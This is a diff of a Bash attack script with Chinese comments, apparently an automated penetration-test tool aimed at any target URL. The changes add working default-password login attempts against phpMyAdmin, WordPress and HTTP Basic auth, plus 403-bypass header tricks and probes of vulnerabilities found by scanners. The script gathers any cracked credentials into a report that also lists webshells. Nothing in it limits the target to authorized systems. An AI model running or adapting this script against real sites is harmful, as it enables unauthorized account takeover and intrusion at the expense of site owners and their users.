@@ -1,6 +1,6 @@
 #!/bin/bash
-# 手动+工具混合渗透测试脚本
-# 优化版本：手动发现 + 工具验证 + 批量利用
+# 手动+工具混合渗透测试（直接调用工具，不写自定义脚本）
+# 使用方法: bash hybrid_attack.sh <target_url>
 
 TARGET="${1:-}"
 OUT_DIR="/root/hybrid_attack/$(date +%Y%m%d_%H%M%S)"
@@ -33,13 +33,12 @@ curl -skL -m 5 "$TARGET" -o "$OUT_DIR/index.html" -w "HTTP状态: %{http_code}\n
 echo "标题: $(grep -iE '<title>' "$OUT_DIR/index.html" 2>/dev/null | sed 's/.*<title>\(.*\)<\/title>.*/\1/')"
 echo ""
 
-# 1.2 技术栈识别（手动+whatweb）
+# 1.2 技术栈识别
 echo "[1.2] 技术栈识别..."
 if command -v whatweb &> /dev/null; then
     whatweb -a 3 "$TARGET" --log-json="$OUT_DIR/whatweb.json" 2>/dev/null
     echo "技术栈: $(cat "$OUT_DIR/whatweb.json" 2>/dev/null | jq -r '.[0].plugins | keys[]' 2>/dev/null | head -5 | tr '\n' ', ')"
 else
-    # 手动识别
     TECH=$(curl -skL -m 5 "$TARGET" 2>/dev/null | grep -iE 'powered by|wp-content|laravel|drupal|joomla' | head -3)
     echo "技术栈: $TECH"
 fi
@@ -140,20 +139,25 @@ echo ""
 # 3.1 验证nuclei发现的漏洞
 if [ -f "$OUT_DIR/nuclei_cves.txt" ] && [ -s "$OUT_DIR/nuclei_cves.txt" ]; then
     echo "[3.1] 验证nuclei发现的漏洞..."
-    while IFS= read -r vuln; do
+    head -5 "$OUT_DIR/nuclei_cves.txt" | while IFS= read -r vuln; do
         echo "  🔍 验证: $vuln"
-        # 手动验证逻辑
-    done < "$OUT_DIR/nuclei_cves.txt"
+        # 手动验证：提取URL并测试
+        vuln_url=$(echo "$vuln" | grep -oE 'https?://[^ ]+' | head -1)
+        if [ -n "$vuln_url" ]; then
+            resp=$(curl -skL -m 5 "$vuln_url" 2>/dev/null)
+            echo "$resp" | grep -qiE "vulnerable|exploit|poc" && echo "    ✅ 漏洞确认" || echo "    ⚠️  需手动验证"
+        fi
+    done
     echo ""
 fi
 
 # 3.2 验证ffuf发现的目录（重点测试403）
 if [ -f "$OUT_DIR/ffuf_dirs.json" ]; then
-    echo "[3.2] 验证ffuf发现的目录..."
+    echo "[3.2] 验证ffuf发现的403目录（手动绕过测试）..."
     jq -r '.results[] | select(.status==403) | "\(.url)|\(.status)"' "$OUT_DIR/ffuf_dirs.json" 2>/dev/null | head -10 | while IFS='|' read -r url status; do
         echo "  🔍 测试403绕过: $url"
-        # 403绕过测试
-        for header in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: $(echo $url | sed 's|.*://[^/]*||')"; do
+        # 手动403绕过测试
+        for header in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: $(echo $url | sed 's|.*://[^/]*||')" "X-Rewrite-URL: $(echo $url | sed 's|.*://[^/]*||')"; do
             new_status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' -H "$header" "$url" 2>/dev/null)
             [ "$new_status" = "200" ] && echo "    ✅ 绕过成功: $header"
         done
@@ -213,63 +217,67 @@ else
 fi
 echo ""
 
-# 4.2 精确弱口令检测（替代hydra，减少误报）
-echo "[4.2] 精确弱口令检测..."
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-CRACK_SCRIPT="$SCRIPT_DIR/precise_password_crack.sh"
-
-if [ ! -f "$CRACK_SCRIPT" ]; then
-    CRACK_SCRIPT="/root/manual_test/precise_password_crack.sh"
+# 4.2 手动弱口令测试（直接curl，不写脚本）
+echo "[4.2] 手动弱口令测试（精确检测）..."
+# phpMyAdmin弱口令
+if curl -skL -m 3 "$TARGET/phpmyadmin" 2>/dev/null | grep -qi "phpmyadmin"; then
+    echo "  🔍 phpMyAdmin弱口令测试..."
+    for cred in "root:root" "admin:admin" "root:123456" "admin:123456" "root:password" "admin:password"; do
+        user=$(echo $cred | cut -d: -f1)
+        pass=$(echo $cred | cut -d: -f2)
+        resp=$(curl -skL -m 5 -X POST "$TARGET/phpmyadmin/index.php" \
+            -d "pma_username=$user&pma_password=$pass&server=1" -L -c /tmp/pmac_$$ 2>/dev/null)
+        if echo "$resp" | grep -qiE 'main|server|database|structure' && \
+           ! echo "$resp" | grep -qiE 'login|error|incorrect|invalid.*login|wrong.*password'; then
+            # 二次验证
+            verify=$(curl -skL -m 3 "$TARGET/phpmyadmin/main.php" -b /tmp/pmac_$$ 2>/dev/null)
+            if echo "$verify" | grep -qiE 'database|table|server'; then
+                echo "    ✅ 成功！凭证: $cred"
+                echo "$cred" >> "$OUT_DIR/cracked_phpmyadmin.txt"
+            fi
+        fi
+        rm -f /tmp/pmac_$$
+    done
 fi
 
-if [ -f "$CRACK_SCRIPT" ]; then
-    # phpMyAdmin弱口令
-    if curl -skL -m 3 "$TARGET/phpmyadmin" 2>/dev/null | grep -qi "phpmyadmin"; then
-        echo "  🔍 phpMyAdmin精确弱口令检测..."
-        bash "$CRACK_SCRIPT" "$TARGET/phpmyadmin" "phpmyadmin" >> "$OUT_DIR/cracked_phpmyadmin.txt" 2>&1 &
-    fi
-    
-    # WordPress弱口令
-    if echo "$TARGET" | grep -qiE "wordpress|wp-"; then
-        echo "  🔍 WordPress精确弱口令检测..."
-        bash "$CRACK_SCRIPT" "$TARGET" "wordpress" >> "$OUT_DIR/cracked_wordpress.txt" 2>&1 &
-    fi
-    
-    # 通用管理后台弱口令
-    if [ -f "$OUT_DIR/key_paths.txt" ]; then
-        while IFS='|' read -r url status; do
-            if echo "$url" | grep -qiE "/admin|/administrator|/manage|/panel"; then
-                echo "  🔍 管理后台精确弱口令检测: $url"
-                bash "$CRACK_SCRIPT" "$url" "admin" >> "$OUT_DIR/cracked_admin.txt" 2>&1 &
+# WordPress弱口令
+if echo "$TARGET" | grep -qiE "wordpress|wp-"; then
+    echo "  🔍 WordPress弱口令测试..."
+    for cred in "admin:admin" "admin:123456" "admin:password" "administrator:admin"; do
+        user=$(echo $cred | cut -d: -f1)
+        pass=$(echo $cred | cut -d: -f2)
+        resp=$(curl -skL -m 5 -X POST "$TARGET/wp-login.php" \
+            -d "log=$user&pwd=$pass&wp-submit=Log+In" -L -c /tmp/wpc_$$ 2>/dev/null)
+        if echo "$resp" | grep -qiE 'dashboard|wp-admin|admin.*area' && \
+           ! echo "$resp" | grep -qiE 'incorrect|error|invalid|login.*failed|wrong.*password'; then
+            # 二次验证
+            verify=$(curl -skL -m 3 "$TARGET/wp-admin" -b /tmp/wpc_$$ 2>/dev/null)
+            if echo "$verify" | grep -qiE 'dashboard|admin.*menu'; then
+                echo "    ✅ 成功！凭证: $cred"
+                echo "$cred" >> "$OUT_DIR/cracked_wordpress.txt"
             fi
-        done < "$OUT_DIR/key_paths.txt"
-    fi
-    
-    # HTTP Basic认证弱口令
-    for path in "/admin" "/wp-admin" "/phpmyadmin"; do
-        status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' "$TARGET$path" 2>/dev/null)
-        if [ "$status" = "401" ]; then
-            echo "  🔍 HTTP Basic认证精确弱口令检测: $path"
-            bash "$CRACK_SCRIPT" "$TARGET$path" "basic" >> "$OUT_DIR/cracked_basic.txt" 2>&1 &
         fi
+        rm -f /tmp/wpc_$$
     done
-else
-    echo "  ⚠️  精确弱口令检测脚本未找到，使用手动方法..."
-    # 手动方法：只测试最常见的3-5个密码
-    if curl -skL -m 3 "$TARGET/phpmyadmin" 2>/dev/null | grep -qi "phpmyadmin"; then
-        echo "  🔍 phpMyAdmin手动弱口令测试（仅常见密码）..."
-        for cred in "root:root" "admin:admin" "root:123456" "admin:123456"; do
+fi
+
+# HTTP Basic认证弱口令
+for path in "/admin" "/wp-admin" "/phpmyadmin"; do
+    status=$(curl -skL -m 3 -o /dev/null -w '%{http_code}' "$TARGET$path" 2>/dev/null)
+    if [ "$status" = "401" ]; then
+        echo "  🔍 HTTP Basic认证弱口令测试: $path"
+        for cred in "admin:admin" "root:root" "admin:123456"; do
             user=$(echo $cred | cut -d: -f1)
             pass=$(echo $cred | cut -d: -f2)
-            resp=$(curl -skL -m 3 -X POST "$TARGET/phpmyadmin/index.php" \
-                -d "pma_username=$user&pma_password=$pass&server=1" -L 2>/dev/null)
-            if echo "$resp" | grep -qiE 'main|server|database' && \
-               ! echo "$resp" | grep -qiE 'login|error|incorrect|invalid.*login'; then
-                echo "    ✅ 成功: $cred" | tee -a "$OUT_DIR/cracked_phpmyadmin.txt"
+            auth_status=$(curl -skL -m 5 -u "$user:$pass" "$TARGET$path" \
+                -o /dev/null -w '%{http_code}' 2>/dev/null)
+            if [ "$auth_status" = "200" ] || [ "$auth_status" = "301" ] || [ "$auth_status" = "302" ]; then
+                echo "    ✅ 成功！凭证: $cred (HTTP $auth_status)"
+                echo "$cred" >> "$OUT_DIR/cracked_basic.txt"
             fi
         done
     fi
-fi
+done
 echo ""
 
 # 等待批量利用完成
@@ -299,6 +307,13 @@ if [ -f "$OUT_DIR/nuclei_cves.txt" ] && [ -s "$OUT_DIR/nuclei_cves.txt" ]; then
 fi
 echo ""
 
+# 汇总凭证
+if ls "$OUT_DIR"/cracked_*.txt 2>/dev/null | grep -q .; then
+    echo "  ✅ 发现的凭证:"
+    cat "$OUT_DIR"/cracked_*.txt 2>/dev/null
+fi
+echo ""
+
 # 5.2 生成报告
 echo "[5.2] 生成报告..."
 cat > "$OUT_DIR/report.txt" << EOF
@@ -315,6 +330,9 @@ $(cat "$OUT_DIR/shells.txt" 2>/dev/null || echo "无")
 
 【发现的漏洞】
 $(head -10 "$OUT_DIR/nuclei_cves.txt" 2>/dev/null || echo "无")
+
+【发现的凭证】
+$(cat "$OUT_DIR"/cracked_*.txt 2>/dev/null || echo "无")
 
 【关键路径】
 $(cat "$OUT_DIR/key_paths.txt" 2>/dev/null || echo "无")
